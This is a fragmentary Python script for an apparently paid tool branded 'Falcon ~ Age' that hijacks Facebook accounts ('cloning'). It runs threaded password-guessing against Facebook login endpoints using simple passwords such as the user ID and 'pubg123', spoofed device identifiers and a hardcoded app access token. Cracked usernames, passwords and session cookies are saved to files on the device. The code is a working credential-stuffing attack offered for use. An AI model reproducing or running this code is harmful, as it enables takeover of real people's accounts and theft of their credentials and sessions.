...
os.system('xdg-open https://facebook.com/groups/774714457590211/')
...
logo=("""\033[1;37m
     ...
     /     \  __  /    ------
    / /     \(  )/    ----- 
   //////   ' \/ `   ---    〘\033[1;32m+\033[1;37m〙 UPDATED  \033[1;32mPRIMIUM\033[1;37m
  //// / // :    : ---      〘\033[1;32m+\033[1;37m〙 Version 0.2 
 // /   /  /`    '--        〘\033[1;32m+\033[1;37m〙 Author By 
//          //..\\           〘\033[1;32m+\033[1;37m〙 \033[1;32mFalcon ~ Age\033[1;37m
   =======UU====UU=======
           '//||\\`
\033[1;37m─────────────────────────────────────────────────────""")
def linex():
...
def Subscraption():
	...
	if key1 in r1:
		...
		print(logo)
		print ("")
		print("\033[1;32mThis Tool Is Paid You Need Get Approved First\033[1;37m\n")
		print("\033[1;32m Note : Paid Tolls By Falcon ~ Age \033[1;37m")
		print ("")
...
def menu():
			clear()
		#	linex()
			print('[\033[1;32m1\033[1;37m] File cloning\n[\033[1;32m2\033[1;37m] Random cloning\n[\033[1;32m3\033[1;37m] Gmail cloning \n[\033[1;32m4\033[1;37m] Contact Author \n[\033[1;32m0\033[1;37m] Exit menu')
			linex()
			xd=input('[\033[1;32m?\033[1;37m] Choose an option: ')
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				clear()
				print(' Put file example:  \033[1;32m/sdcard/File.txt\033[1;37m ')
				linex()
				file = input(' Put file path\033[1;37m :\033[1;32m ')
				try:
					...
					menu()
				clear()
				print(' Choose Your Best Method Here ')
				linex()
				...
				linex()
				mthd=input('[\033[1;32m?\033[1;37m] Choose: ')
				linex()
				plist = []
				try:
				...
				os.system('xdg-open https://www.facebook.com/gieQty')
				menu()
			elif xd in ['0','00']:
		...
		with tred(max_workers=30) as TRT:	
			...
			for psx in user:
				...
				if pcs in ['2','02']:
					...
					passlist = [psx,ids,'pubg','pubg1122','pubgfalcon','pubg12','pubg123','pubg1234']
				elif pcs in ['4','04']:
		...
		try:
			...
			for pw in passlist:
				...
				if 'session_key' in q:
					...
					open('/sdcard/falcon-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [Checkpoint] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/falcon-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/falcon-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.47 Safari/537.36'
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/falcon-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/falcon-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Falcon - 2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/falcon-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/falcon-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Mozilla/5.0 (Linux; Android 10; TECNO KC8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Mobile Safari/537.36'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [Checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/falcon-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Running-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [Running-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [Running-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [Running-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Successful] '+str(uid)+' | '+pas+'\033[1;97m')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [Checkpoint] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/falcon-rnd-cp.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				...
				open('/sdcard/falcon-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [Checkpoint] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/falcon-rnd-cp.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/falcon-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
...
def trt4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [Running-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [falcon-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [Successful] '+uid+' | '+pas)
						open('/sdcard/falcon-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [Checkpoint] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/falcon-rnd-cp.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
